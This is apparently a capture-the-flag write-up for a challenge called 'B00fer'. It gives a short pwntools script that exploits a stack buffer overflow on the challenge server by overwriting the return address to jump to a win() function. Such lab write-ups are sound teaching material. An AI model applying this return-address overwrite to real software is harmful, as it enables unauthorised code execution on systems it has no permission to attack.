# B00fer

Solved by: @vicevirus

## Question:
The Consortium sent us this file and connection info. Looks like they are taunting us.

They are running the file at b00fer.niccgetsspooky.xyz, at port 9001. Try to get them to give up the flag.

## Solution:
```
from pwn import *

# Establish the remote connection
conn = remote('b00fer.niccgetsspooky.xyz', 9001)

# Addresses
win_addr = 0x401227  # Address of win() function

# Overflow payload
payload = b'A' * 32      # Overflow buffer
payload += b'B' * 8      # Overwrite saved frame pointer
payload += p64(win_addr) # Overwrite return address to call win()

# Send payload
conn.recvuntil(b"NO WAY you are getting our flag.\n")
conn.sendline(payload)

# Receive the flag
conn.interactive()
```

**Flag:** ``
